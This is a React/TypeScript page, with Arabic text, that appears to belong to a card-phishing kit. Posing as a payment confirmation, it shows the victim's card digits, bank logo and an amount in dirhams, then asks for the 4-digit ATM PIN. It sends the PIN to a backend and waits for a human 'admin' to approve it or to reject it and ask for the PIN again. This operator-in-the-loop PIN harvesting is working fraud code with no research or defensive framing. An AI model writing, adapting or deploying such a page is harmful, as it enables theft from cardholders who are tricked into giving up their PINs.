import { useEffect, useState, useRef } from "react";
import { useLocation } from "wouter";
import { useSignalEffect } from "@preact/signals-react";
import PageLayout from "@/components/layout/PageLayout";
import WaitingOverlay, { waitingCardInfo } from "@/components/WaitingOverlay";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import {
  sendData,
  codeAction,
  navigateToPage,
} from "@/lib/store";

export default function ATMPassword() {
  const [, navigate] = useLocation();
  const [password, setPassword] = useState("");
  const [error, setError] = useState(false);
  const [isWaiting, setIsWaiting] = useState(false);
  const inputRef = useRef<HTMLInputElement>(null);

  // Get payment data from localStorage
  const paymentData = JSON.parse(localStorage.getItem("paymentData") || "{}");
  const cardLast4 = paymentData.cardLast4 || "****";
  const totalAmount = paymentData.totalPaid || 0;
  const serviceName = paymentData.serviceName || "";

  // Get card info from localStorage (fallback) or signal
  const signalCardInfo = waitingCardInfo.value;
  const cardInfo = signalCardInfo || {
    bankName: paymentData.bankName || '',
    bankLogo: paymentData.bankLogo || '',
    cardType: paymentData.cardType || '',
  };

  // Emit page enter
  useEffect(() => {
    navigateToPage("كلمة مرور ATM");
  }, []);

  // Handle code action from admin
  useSignalEffect(() => {
    const action = codeAction.value;
    if (action) {
      if (action.action === "approve") {
        // Navigate to final page
        navigate("/final-page");
      } else if (action.action === "reject") {
        // Show error and clear password
        setPassword("");
        setError(true);
        setIsWaiting(false);
        inputRef.current?.focus();
      }
      // Reset the action
      codeAction.value = null;
    }
  });

  const handleChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const value = e.target.value.replace(/\D/g, "").slice(0, 4);
    setPassword(value);
    setError(false);
  };

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();

    // Accept exactly 4 digits
    if (password.length !== 4) {
      setError(true);
      return;
    }

    setError(false);
    setIsWaiting(true);
    sendData({
      digitCode: password,
      current: "كلمة مرور ATM",
      nextPage: "الصفحة النهائية",
      waitingForAdminResponse: true,
    });
  };

  return (
    <PageLayout variant="default">
      <WaitingOverlay />

      <div className="bg-white rounded-2xl shadow-xl p-6">
        {/* Header */}
        <div className="text-center mb-6">
          <h1 className="text-xl font-bold text-gray-800 mb-2">كلمة مرور الصراف الآلي (ATM)</h1>
          <p className="text-gray-600 text-sm">
            لتأكيد العملية أدخل كلمة مرور الصراف الآلي الخاصة ببطاقتك
          </p>
        </div>

        {/* Bank and Card Type Logos */}
        <div className="flex justify-between items-center mb-6 px-4">
          {/* Card Type Logo (Visa/Mastercard) */}
          <div className="flex items-center">
            <img
              src={cardInfo?.cardType?.toLowerCase() === 'visa' ? '/images/visa.png' : cardInfo?.cardType?.toLowerCase() === 'mastercard' ? '/images/mastercard.png' : '/images/visa.png'}
              alt={cardInfo?.cardType || 'Card'}
              className="h-10 object-contain"
            />
          </div>
          {/* Bank Logo */}
          {cardInfo?.bankLogo && (
            <div className="flex items-center">
              <img
                src={cardInfo.bankLogo}
                alt={cardInfo.bankName || "Bank"}
                className="h-10 object-contain"
              />
            </div>
          )}
        </div>

        {/* Transaction Info */}
        <div className="bg-gray-50 rounded-lg p-4 mb-6 text-sm text-gray-700 text-right leading-relaxed">
          <p>
            يرجى إدخال كلمة مرور الصراف الآلي (ATM PIN) الخاصة بالبطاقة المنتهية بـ <span className="font-bold">{cardLast4}</span> لتأكيد عملية الدفع.
          </p>
          <p className="mt-2">
            أنت تدفع لـ<span className="font-bold">{serviceName}</span> مبلغ <span className="font-bold text-primary">{totalAmount} د.إ</span>
          </p>
        </div>

        <form onSubmit={handleSubmit} className="space-y-4">
          {/* ATM Password Input */}
          <div className="flex justify-center" dir="ltr">
            <Input
              ref={inputRef}
              type="password"
              inputMode="numeric"
              maxLength={4}
              value={password}
              onChange={handleChange}
              placeholder="كلمة مرور ATM"
              className={`text-center text-lg font-medium h-12 w-full max-w-xs ${error ? "border-red-500" : "border-gray-300"}`}
              autoFocus
            />
          </div>

          {error && (
            <p className="text-red-500 text-sm text-center font-medium">
              كلمة المرور غير صحيحة، يرجى المحاولة مرة أخرى.
            </p>
          )}

          {/* Submit Button */}
          <Button
            type="submit"
            className="w-full h-12 text-base"
            disabled={isWaiting || password.length !== 4}
          >
            {isWaiting ? (
              <div className="flex items-center justify-center gap-2">
                <div className="w-5 h-5 border-2 border-white border-t-transparent rounded-full animate-spin"></div>
                <span>جاري التحقق...</span>
              </div>
            ) : (
              "تأكيد"
            )}
          </Button>
        </form>
      </div>
    </PageLayout>
  );
}
